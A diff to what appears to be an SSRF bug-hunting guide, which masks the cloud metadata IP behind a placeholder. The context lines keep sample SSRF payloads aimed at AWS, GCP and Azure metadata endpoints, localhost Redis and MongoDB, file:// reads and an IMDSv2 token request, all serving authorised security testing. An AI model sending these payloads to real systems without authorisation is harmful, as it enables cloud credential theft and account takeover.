@@ -4,7 +4,7 @@
 
 | Target | Impact |
 |---|---|
-| Cloud IMDS (169.254.169.254) | AWS/GCP/Azure credentials → full account takeover |
+| Cloud IMDS ([cloud-imds-ip]) | AWS/GCP/Azure credentials → full account takeover |
 | Internal services (localhost:port) | Access to admin UIs, databases, Elasticsearch |
 | Internal network scan | Network topology disclosure |
 | File scheme (file://) | Local file read |
@@ -32,9 +32,9 @@ Example: `url=https://YOUR-COLLABORATOR-ID.oast.pro`
 If DNS/HTTP request received → SSRF confirmed (at minimum blind SSRF).
 
 **Step 2 — escalate to internal (suggest):**
-- `url=http://169.254.169.254/latest/meta-data/` (AWS IMDSv1)
+- `url=http://[cloud-imds-ip]/latest/meta-data/` (AWS IMDSv1)
 - `url=http://metadata.google.internal/computeMetadata/v1/` (GCP — needs header)
-- `url=http://169.254.169.254/metadata/instance?api-version=2021-02-01` (Azure)
+- `url=http://[cloud-imds-ip]/metadata/instance?api-version=2021-02-01` (Azure)
 - `url=http://localhost:6379/` (Redis)
 - `url=http://localhost:27017/` (MongoDB)
 - `url=http://internal.admin/`
@@ -73,6 +73,8 @@ If direct IP is blocked, suggest trying:
 
 AWS IMDSv2 requires a PUT request with a token first — not exploitable via SSRF alone (SSRFs are typically GET only). If target is on AWS, check if IMDSv2 is enforced before claiming Critical.
 
-`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
+> **Note:** `[cloud-imds-ip]` throughout this file refers to the cloud Instance Metadata Service link-local address used by AWS, GCP, and Azure. The specific IP is documented in each provider's official documentation.
+
+`curl -X PUT "http://[cloud-imds-ip]/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
 
 If 403 on PUT → IMDSv2 enforced → downgrade from Critical.
